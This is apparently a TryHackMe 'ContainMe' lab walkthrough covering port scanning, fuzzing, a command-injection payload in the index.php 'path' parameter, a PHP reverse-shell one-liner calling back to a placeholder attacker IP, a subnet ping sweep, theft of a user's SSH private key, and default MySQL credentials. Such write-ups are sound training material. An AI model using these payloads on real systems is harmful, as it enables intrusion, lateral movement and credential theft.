# ContainMe - THM -Walkthrough <img width="90" height="89" alt="1_urU3DCALxSjKakNfdRlyGQ" src="https://github.com/user-attachments/assets/c9bc61b9-fea8-4efe-b9ad-c393bd913c37" />


## Enumeration
We will start with Nmap scan to see what open ports and what services are running on the target machine.
```
nmap -sV -sC -T4 -o nmapScan <IP>

OUTPUT
# Nmap 7.94SVN scan initiated Fri Sep 19 09:30:25 2025 as: /usr/lib/nmap/nmap -sV -sC -T4 -o nmapScan 10.10.29.198
Nmap scan report for 10.10.29.198
Host is up (0.084s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:d7:72:6c:1f:ca:7b:6c:d1:99:90:fb:9e:74:81:75 (RSA)
|   256 c3:ef:e0:50:13:ab:96:fd:09:28:5c:dd:f7:1f:f6:34 (ECDSA)
|_  256 7b:bc:3f:a3:5a:d5:ab:a3:6f:98:95:bd:5f:8a:c1:2e (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 19 09:33:38 2025 -- 1 IP address (1 host up) scanned in 192.69 seconds

```
There is a HTTP servie at port 80/tcp and this is what we are going to investigate first.

## Command Injection
It's a default Apache page. So, I try to fuzz it using FFUF tool to find a hidden file or directory.
```
ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html

RESULTS THAT WE CARE ABOUT
index.php
info.php
```
If we visit the info.php we will find the PHP Version 7.2.24 which is vulnerable to RCE. The index.php is more interesting and it contains a list of files in a folder on the Server.

<img width="525" height="195" alt="image" src="https://github.com/user-attachments/assets/491a69a8-d8fa-4ea1-9b52-d25f4bd35163" />

I give a try and test some wordkeys like cmd of just a ? after the .php extention but with no luck. So I try again with FFUF but this time a little bit different.
```
ffuf -u http://<target-ip>/index.php?FUZZ=whoami -w /usr/share/wordlists/burp_parameter_names.txt -fs 329

OUTPUT
path 
```
We have a parameter that we can use, but it will not work just like that. It take me a while but i figure the it need a semicolom (;) before the command. So the full URL with the whoami command must be
```
http://<target-ip>/index.php?path=;whoami

OUTPUT
www-data
```
<img width="619" height="200" alt="image" src="https://github.com/user-attachments/assets/3c7eeb1e-dff6-4808-9df4-cad27d404e44" />

## Shell
Here is the idea for a python script that it will help a little. It's the **command_injection.py** script. With this script i can navigate to the directories and files that the www-data user has access. With this way i found the user mike under the home directory.
<img width="446" height="466" alt="image" src="https://github.com/user-attachments/assets/4a3fb30e-5420-4a76-bc76-e2e1e7c6d151" />

So now it's time to send a revesre shell and take access on the target system. I use a php reverse shell that I find on Reverse Shell Generator (https://www.revshells.com/) and before I use it a start a netcat listener.
```
php -r '$sock=fsockopen("YOUR-IP",4444);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
<img width="1907" height="598" alt="image" src="https://github.com/user-attachments/assets/9e5579d2-eff7-4c7d-bee2-bb69ec3d5660" />

Navigating to user Mike there are some hidden files that we have no permissions(.ssh) but there is also a file called **1cryptupx** and it is executable. 

<img width="576" height="232" alt="image" src="https://github.com/user-attachments/assets/bbb223c7-453a-45b9-80bf-20d843de5678" />

## Root Access
Let's run it as mike. We will see the following.

<img width="667" height="139" alt="image" src="https://github.com/user-attachments/assets/dade25ea-2f17-4894-a4f8-9ef82863e977" />

So there is a file that we can execute and take access to the container. A good command is to find the 4000 permissions that www-data has.

<img width="718" height="555" alt="image" src="https://github.com/user-attachments/assets/80515c27-6660-4196-b77d-93ed9c2ce3d5" />

Now we know the location of the executable file that we can run as user mike. The root folder dosen't contain anything good but the interesting thing is the host1

That means that we are not alone in the network and there is at least one other machine here. So we can ping the whole subnet (because the nmap dosen't work) and see who will response. So I first check the IP address and then I ping the /24 subnet with a for loop that pings the hosts.
```
STEPS

1) ->ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:9c:ff:0f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.250.10/24 brd 192.168.250.255 scope global dynamic eth0
       valid_lft 2453sec preferred_lft 2453sec
    inet6 fe80::216:3eff:fe9c:ff0f/64 scope link 
       valid_lft forever preferred_lft forever
7: eth1@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:46:6b:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.20.2/24 brd 172.16.20.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe46:6b29/64 scope link 
       valid_lft forever preferred_lft forever

Subnet: 172.16.20.0/24

2)
-> for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done

IP ALIVE: 172.16.20.6
```

<img width="665" height="67" alt="image" src="https://github.com/user-attachments/assets/9dfc2789-385f-4c41-88c9-8db891ca7167" />

Perfect, now we have a host and also we can check for the id_rsa file that is located under the /home/mike/.ssh/id_rsa path. The reason that we can see it now is because we are root on host1 as we mention before.
```
cat /home/mike/.ssh/id_rsa
```

After save it in a file we can ssh the user mike(note that the permissions of id_rsa must change to 600 -> chmod 600 id_rsa).

```
ssh mike@172.16.20.6 -i id_rsa
```

<img width="552" height="197" alt="image" src="https://github.com/user-attachments/assets/652e52de-98e0-4574-a2d4-ab04034338a5" />

We are host2 now and we can keep going. After checking around I found a SQL listening port using 
```
netstat -tulpen
```

<img width="286" height="31" alt="image" src="https://github.com/user-attachments/assets/a211675a-3934-48ab-8832-0eadf48e9417" />

That means we can access mysql database.

```
mysql -u mike -p
It will ask for a password which is default "password"
```

And we are in. Now we will try to find some password. After a bit the cleartext password are located in table users.
```
show databases;
use accounts;
show tables;
select * from users;
```

<img width="599" height="712" alt="image" src="https://github.com/user-attachments/assets/368efd06-6c92-447a-a64a-43ee6cd2cef9" />

We have both mike and root password. Let's switch to root user by typing su root.
If we navigate to /root directory we will see a zip file named mike.zip

<img width="590" height="167" alt="image" src="https://github.com/user-attachments/assets/74d74c2f-8ff0-4899-aa1b-64464c4efb1a" />

If we try to unzip it, it will ask for mike's password and then after put the password we will be able to take the machines flag.

<img width="275" height="140" alt="image" src="https://github.com/user-attachments/assets/fca509bf-70ea-4f43-9f61-97fd185c6eb5" />


